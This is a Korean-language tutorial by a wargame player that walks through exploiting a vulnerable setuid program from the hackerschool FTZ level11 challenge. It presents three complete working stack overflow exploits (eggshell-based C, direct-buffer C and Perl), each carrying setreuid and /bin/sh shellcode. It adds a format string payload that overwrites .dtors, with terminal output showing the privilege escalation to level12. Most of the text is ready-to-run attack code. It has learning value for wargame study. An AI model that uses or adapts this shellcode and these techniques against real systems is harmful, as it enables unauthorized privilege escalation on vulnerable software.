                        ++ How to make stack buffer overflow exploit ++
   
                                                                     indra(1ndr4@hanmail.net)

Section.
~~~~~~~~
0x0. introduction.
0x1. egg shell based exploit.
0x2. direct buffer input exploit.
0x3. writing exploit with perl.
0x4. [append] fundamentals format string bug.

0x0. introduction.
~~~~~~~~~~~~~~~~~~

이 문서는 어디까지나 필자의 study 결과를 정리해 놓은것일뿐이므로
존칭은 생략할것이다.
단지 지식정리 외 결과정리를 위한 문서이므로 이해를 바란다.
이 문서는 본인이 가지고 있는 stack 기반 오버플로우 익스플로잇 기법을 정리한 문서이다.
각 취약점 익스플로잇 예제는 wargame 중 하나인 hackerschool 의 level11 문제로 통일한다.
해당 취약프로그램 소스코드는 다음과 같다.

/* vuln.c */
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
	char str[256];
	
	strcpy(str, argv[1]);
	printf(str);
}

위 예제는 BOF 취약점 외에 format string bug(이하 fsb) 도 함께 가지고 있다.
fsb 는 열외로 네번째 section 에서 간단하게 다룬다.
 
0x1. egg shell based exploit.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

이 기법은 egg shell 소스코드를 변경하여 exploit 을 만드는 기법이다.
본인이 즐겨 쓰는 기법 중 하나인데,
eggshell code 는 인터넷 어디든지 널려 있으므로 구하기 쉽고
이를 약간 수정하여 익스플로잇 하므로 빠른시간 안에 익스플로잇을
만들어 낼수 있다는 장점이 있다.

[level11@ftz indra]$ ln -sf /home/level11/attackme .
[level11@ftz indra]$ ls -al attackme
lrwxrwxrwx    1 level11  level11   22 Jan 22 23:34 attackme -> /home/level11/attackme
[level11@ftz indra]$ ./attackme
Segmentation fault
[level11@ftz indra]$

물론 처음 실행하면 segmentation fault error 가 난다.
정해지지 않은 argv[1] 을 출력하려 시도했기 때문이다.
hackerschool 의 level11 문제는 이미 source code 가 공개되어 있지만
source code 가 공개되어 있지 않을때는 gdb 로 대강의 buffer 의 크기들을
추측해볼수 있다.
gdb 를 이용해 구조를 본다.

[level11@ftz indra]$ gdb -q ./attackme
(no debugging symbols found)...(gdb) disas main
Dump of assembler code for function main:
0x80483f8 <main>:  push   %ebp
0x80483f9 <main+1>: mov    %esp,%ebp
0x80483fb <main+3>: sub    $0x100,%esp
0x8048401 <main+9>: mov    0xc(%ebp),%eax
0x8048404 <main+12>:    add    $0x4,%eax
0x8048407 <main+15>:    mov    (%eax),%edx
....
(gdb)
 
위에서 esp 레지스터에서 16진수 0x100 만큼을 sub 하였다.
16진수 0x100 은 10진수 256과 같다.
buffer 의 정해진 값이 256bytes 라는것을 알았고,
구조는 자연스레 다음과 같다는 결론이 나온다.

[ buffer (256bytes) ] + [ ebp register (4bytes) ] + [ ret address or eip (4bytes) ]

그럼 바로 egg shell 을 수정하여 익스플로잇을 만들어 본다.

------------------------------------------------------- [ eggshell.c ]

/* eggshell.c */
  1 #include <stdlib.h>
  2
  3 #define DEFAULT_OFFSET 0
  4 #define DEFAULT_BUFFER_SIZE 512
  5 #define DEFAULT_EGG_SIZE 2048
  6 #define NOP 0x90
  7
  8 char shellcode[] =
  9    "\x55\x89\xe5\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"
 10    "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89"
 11    "\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
 12    "\x00\xc9\xc3\x90/bin/sh";
 13
 14 unsigned long get_esp(void)
 15 {
 16    __asm__("movl %esp,%eax");
 17 }
 18
 19 int main(int argc, char *argv[])
 20 {
 21    char *buff, *ptr, *egg;
 22    long *addr_ptr, addr;
 23    int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
 24    int i, eggsize=DEFAULT_EGG_SIZE;
 25
 26    if (argc > 1) bsize = atoi(argv[1]);
 27    if (argc > 2) offset = atoi(argv[2]);
 28    if (argc > 3) eggsize = atoi(argv[3]);
 29
 30    if (!(buff = malloc(bsize))) {
 31      printf("Can't allocate memory.\n");
 32      exit(0);
 33    }
 34
 35    if (!(egg = malloc(eggsize))) {
 36      printf("Can't allocate memory.\n");
 37      exit(0);
 38    }
 39
 40    addr = get_esp() - offset;
 41
 42    printf("Using address: 0x%x\n", addr);
 43
 44    ptr = buff;
 45    addr_ptr = (long *) ptr;
 46    for (i = 0; i < bsize; i+=4)
 47      *(addr_ptr++) = addr;
 48
 49    ptr = egg;
 50    for(i = 0; i < eggsize - strlen(shellcode) - 1; i++)
 51      *(ptr++) = NOP;
 52    for(i = 0; i < strlen(shellcode); i++)
 53      *(ptr++) = shellcode[i];
 54
 55    buff[bsize - 1] = '\0';
 56    egg[eggsize - 1] = '\0';
 57    memcpy(egg,"EGG=",4);
 58    putenv(egg);
 59    memcpy(buff,"RET=",4);
 60    putenv(buff);
 61    system("/bin/bash");
 62 }
/* end of file */

------------------------------------------------------- [ eggshell.c ]

원래의 egg 소스코드 이다.
먼저 다음의 코딩기법은 각자 코딩하는 방법에 따라 틀릴수 있다.
아래에 egg 를 수정하는건 본인의 방식일뿐이다.
*diff 결과처럼 라인을 뺀 부분은 앞부분에 - 로, 새로 쓴 부분은 + 로 표기한다.
 또한 중요부분만 표기하도록 하겠다. 

먼저 #define 에 있는 부분을 싹 다 없애버리고 새로 정의한다.
offset 부분과 eggsize, buffer size 부분을 삭제하였다.
그리고 그 부분에 offset 과 취약프로그램 PATH 를 새로 정의 하였다.

-#define DEFAULT_OFFSET 0
-#define DEFAULT_BUFFER_SIZE 512
-#define DEFAULT_EGG_SIZE 2048
-#define NOP 0x90
+#define NOP    0x90
+#define TARGET "/home/level11/attackme"
+#define OFFSET 256

기존에 있던 shellcode 윗부분에 setreuid() 의 코드를 추가하였다.
+       "\x31\xc9"              /* xor    %ecx,%ecx */
+       "\x66\xb9\x14\x0c"      /* mov    $0xc14,%cx */
+       "\x31\xdb"              /* xor    %ebx,%ebx */
+       "\x66\xbb\x14\x0c"      /* mov    $0xc14,%bx */
+       "\x31\xc0"              /* xor    %eax,%eax */
+       "\xb0\x46"              /* mov    $0x46,%al */
+       "\xcd\x80"              /* int    $0x80 */

다시 말하지만 아래에 있는 비교 결과는 같다. 
개인코딩방식의 차이일뿐.
-       if (!(buff = malloc(bsize))) {
+       if((buff = malloc(OFFSET+8)) == NULL) {

buff 의 내용을 취약프로그램 실행의 인자로 사용하기 때문에
굳이 마지막에 NULL 을 넣는 작업을 하지 않았다.
-       buff[bsize - 1] = '\0';

아까도 말했듯이 아래부분은 buff 변수에 넣는 작업이므로
아예 빼버렸다.
-       memcpy(buff,"RET=",4);
-       putenv(buff);

system() 로 새로운 shell 을 실행하는 부분을 삭제하고
execl() 로 취약프로그램을 실행하는 부분을 넣었다.
물론 기존 egg 에서 buff 의 내용(ret address)을 
환경변수에 저장하는 부분 대신 그 buff 변수의 내용을 
실행프로그램의 인자로 대신하였다.
-       system("/bin/bash");
+
+       execl(TARGET, "attackme", buff, 0);
 }

[+] 완성된 exploit.

------------------------------------------------------- [ exploit_1.c ]

/* 
* Exploit for hackerschool level11 
* Coded by indra(1ndr4@hanmail.net)
*/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>

#define NOP	0x90
#define TARGET	"/home/level11/attackme"
#define OFFSET	256

char shellcode[] = 
	"\x31\xc9"		/* xor    %ecx,%ecx */
	"\x66\xb9\x14\x0c"	/* mov    $0xc14,%cx */
	"\x31\xdb"		/* xor    %ebx,%ebx */
	"\x66\xbb\x14\x0c"	/* mov    $0xc14,%bx */
	"\x31\xc0"		/* xor    %eax,%eax */
	"\xb0\x46"		/* mov    $0x46,%al */
	"\xcd\x80"		/* int    $0x80 */
	"\x55\x89\xe5\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46" 
	"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89" 
	"\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" 
	"\x00\xc9\xc3\x90/bin/sh"; 

unsigned long get_esp()
{
	__asm__("movl %esp,%eax");
}

int main()
{
	char *ptr, *egg, *cmd;
	long *addr_ptr, addr;
	int i;

	if((egg = malloc(2048)) == NULL) {
		printf("can't allocate memory to egg.\n");
		exit(0);
	}
	
	if((cmd = malloc(OFFSET+8)) == NULL) {
		printf("can't allocate memoty to cmd.\n");
		exit(0);
	}

	addr = get_esp();

	printf("return address : 0x%x\n", addr);
	
	/* for arguments value */
	ptr = cmd;
	addr_ptr = (long*)ptr;
	for(i = 0; i < OFFSET+8; i+=4)
		*(addr_ptr++) = addr;

	/* for shellcode */
	ptr = egg;
	for(i = 0; i < 2048 - strlen(shellcode) -1; i++)
		*(ptr++) = NOP;
	for(i = 0; i < strlen(shellcode); i++)
		*(ptr++) = shellcode[i];
	
	egg[2048 - 1] = '\0';

	memcpy(egg, "EGG=", 4);
	putenv(egg);

	execl(TARGET, "attackme", cmd, 0);
} /* End of exploit */

------------------------------------------------------- [ exploit_1.c ]

[level11@ftz indra]$ cc -o exploit_1 exploit_1.c && id; ./exploit_1
uid=3091(level11) gid=3091(level11) groups=3091(level11)
Using address : 0xbffffab8
sh-2.05a$ id
uid=3092(level12) gid=3091(level11) groups=3091(level11)
sh-2.05a$

0x2. direct buffer input exploit.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

이번에는 egg shell 기반이 아닌 정해진 buffer 안에 직접 shellcode 를 넣어
shellcode 를 실행하는 방법으로 익스플로잇을 제작한다.
level11 취약프로그램의 buffer 는 256bytes 이므로 
shellcode 를 넣을 공간이 충분하다.
다음을 보자.

[level11@ftz indra]$ gdb -q /home/level11/attackme
(no debugging symbols found)...(gdb)
(gdb) r `perl -e 'print "A"x264'`
Starting program: /home/level11/attackme `perl -e 'print "A"x264'`
(no debugging symbols found)...(no debugging symbols found)...
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info reg esp
esp            0xbffff9d0       0xbffff9d0
(gdb) x/16bx $esp-268
0xbffff8c4:     0xc8    0xf8    0xff    0xbf    0x41    0x41    0x41    0x41
0xbffff8cc:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
(gdb) x/16bx $esp-264
0xbffff8c8:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0xbffff8d0:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
(gdb)

'A' 문자를 264개로 해서 ret 을 덮어씌워 프로그램 실행이 중지된 가운데
잡혀있는 esp 레지스터 값이 0xbffff9d0 였다.
이 값에서 문자의 갯수인 264bytes 위로 올라가니 
인자로 넣었던 값의 어드레스를 알수 있었다.
그 값은 0xbffff8c8 이다.
이를 토대로 해당 buffer 에 NOP code + shellcode 를 넣고 ret address 를
인자의 처음 부분인 0xbffff8c8 로 바꾸면 되겠다.

------------------------------------------------------- [ exploit_2.c ]
/* 
* Exploit for hackerschool level11 
* Coded by indra(1ndr4@hanmail.net)
*/
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

#define NOP	0x90
#define TARGET	"/home/level11/attackme"
#define	OFFSET	256

char shellcode[] =
	/* setreuid() */ 
	"\x31\xc9"		/* xor    %ecx,%ecx */
	"\x66\xb9\x14\x0c"	/* mov    $0xc14,%cx */
	"\x31\xdb"		/* xor    %ebx,%ebx */
	"\x66\xbb\x14\x0c"	/* mov    $0xc14,%bx */
	"\x31\xc0"		/* xor    %eax,%eax */
	"\xb0\x46"		/* mov    $0x46,%al */
	"\xcd\x80"		/* int    $0x80 */
	/* egg shell code */
	"\x55\x89\xe5\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46"
	"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89"
	"\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
	/* ebp + ret overwrite */
	"\xc8\xf8\xff\xbf\xc8\xf8\xff\xbf";

int main(int argc, char *argv[])
{
	char buf[OFFSET+8];
	int i, sclen, j;

	sclen = strlen(shellcode);
	
	for(i = 0; i < (sizeof(buf)-sclen); i++)
		buf[i] = NOP;

	for(j = 0; j < sclen; j++) {
		buf[i] = shellcode[j];
		i++;
	}

	execl(TARGET, "attackme", buf, 0);
}

------------------------------------------------------- [ exploit_2.c ]

[level11@ftz indra]$ ./exploit_2
sh-2.05a$ id
uid=3092(level12) gid=3091(level11) groups=3091(level11)
sh-2.05a$

0x3. writing exploit with perl.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

이번엔 exploit 을 perl 로 짜본다.
방법은 0x2 section 에 있는 buffer 에 shellcode 를 저장하여 뽑아내는
방법을 사용한다.
ret address 도 위의 0x2 section 에 나와있는 address 인 0xbffff8c8 로
사용한다.

------------------------------------------------------- [ exploit_3.pl ]

#!/usr/bin/perl
# Exploit for hackerschool level11 
# Coded by indra(1ndr4@hanmail.net)
#
$shellcode = 
	# /* setreuid() */ 
	"\x31\xc9".		# /* xor    %ecx,%ecx */
	"\x66\xb9\x14\x0c".	# /* mov    $0xc14,%cx */
	"\x31\xdb".		# /* xor    %ebx,%ebx */
	"\x66\xbb\x14\x0c".	# /* mov    $0xc14,%bx */
	"\x31\xc0".		# /* xor    %eax,%eax */
	"\xb0\x46".		# /* mov    $0x46,%al */
	"\xcd\x80".		# /* int    $0x80 */
	# /* egg shell code */
	"\x55\x89\xe5\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46".
	"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89".
	"\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68".
	# /* ebp + ret overwrite */
	"\xc8\xf8\xff\xbf\xc8\xf8\xff\xbf";

# $ret = 0xbffff8c8;

# [ buffer size : 256bytes ] + [ ebp & ret overwrite : 8bytes ]  
$offset = 256 + 8;
$nop = "\x90";

printf("ret address : %#x\n", $ret);

for($i = 0; $i < $offset - length($shellcode); $i++) {
	$cmd .= $nop;
}

$cmd .= $shellcode;

exec("/home/level11/attackme \"$cmd\"");

------------------------------------------------------- [ exploit_3.pl ]

offset 값을 오버플로우 시킬수 있는 256 bytes 에
ebp 레지스터와 ret address 를 변경시킬수 있는 8 bytes 를 더하였다.
perl 의 length() 는 C 의 strlen() 과 같은 의미를 지닌다.
그리고 각 변수 뒤에 . 이 붙었다면 그 변수 뒤에 다른 변수의 값을 연결 한다고
볼수 있다.

$A = "AAA";
$B = "BBB";
$A .= $B;

$A 의 결과는 "AAABBB" 가 되는것이다.

도식도로 그려보면 다음과 같다.

N: NOP code (0x90)
S: Shellcode
R: Return address

[NNNNNNNNNNNN] + [SSSSSSSSS] + [RR]
 |_______________________________|

조금 더 자세한 사항을 알고 싶다면 code 를 수정하여 각 변수들의 
값을 printf 로 찍어볼수도 있다.

0x4. [append] fundamentals format string bug.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

[level11@ftz indra]$ ln -sf /home/level11/attackme
[level11@ftz indra]$ ./attackme AAAA%x%x%x%x
AAAA41414141782578257825782540013800[level11@ftz indra]$

위에서 보듯이 level11 의 취약프로그램은 overflow 만이 아닌 
fsb 취약점도 내포하고 있다.
fsb 를 이용하여 level12 의 권한을 획득한다.

일단 결과에서 보듯이 A 의 16진수 41 이 바로 뒤에 붙어 나오므로
%8x 를 이용한 변환문자 계산은 생각하지 않아도 된다.

[level11@ftz indra]$ ls -al /home/level11/attackme
-rwsr-x---    1 level12  level11      4916 Jan 24  1999 /home/level11/attackme
[level11@ftz indra]$

또한 read 권한이 있음으로 objdump 를 사용할수 있기 때문에
.dtors section 을 덮어씌우는 방법으로 fsb 를 진행한다.

=> step by step 1. (리턴 어드레스 알아내기)
 
[level11@ftz indra]$ objdump -h ./attackme | grep dtors
 17 .dtors        00000008  08049498  08049498  00000498  2**2
[level11@ftz indra]$

return address : 0x0804949c (0x08049498 + 4)

=> step by step 2. (egg shell 실행)

물론 setreuid() 가 포함된 egg shell 이다.

[level11@ftz indra]$ cc -o egg egg.c
[level11@ftz indra]$ ./egg
Using address: 0xbffffaa8
[level11@ftz indra]$

=> step by step 3. (거리계산)

0xbffffaa8 = 2분할 

1. 0xfaa8, 2. 0xbfff

거리계산:
(faa8)64168 - 16 = 64152
(1bfff)114687 - (faa8)64168 = 50519

16 은 공격에 사용될 문자의 갯수이다.

=> step by step 4. (구체적인 exploit 구상)

AAAA\x9c\x94\x04\x08AAAA\x9e\x94\x04\x08%%64152c%%n%%50519c%%n

address overwrite 를 2bytes 씩 하게 됨으로
공격 address 역시 2분할로 나누게 된다.
아래는 이러한 계산을 통해서 나온 값이다. 

1. 0x0804949c
2. 0x0804949e (+2bytes)

=> step by step 5. (공격)

[level11@ftz indra]$ ./attackme `(printf "AAAA\x9c\x94\x04\x08AAAA\x9e\x94\x04\x08%%64152c%%n%%50519c%%n")`
...
  sh-2.05a$ id
uid=3092(level12) gid=3091(level11) groups=3091(level11)
sh-2.05a$

------------------------------------------------------- [ +-EOF-+ ]

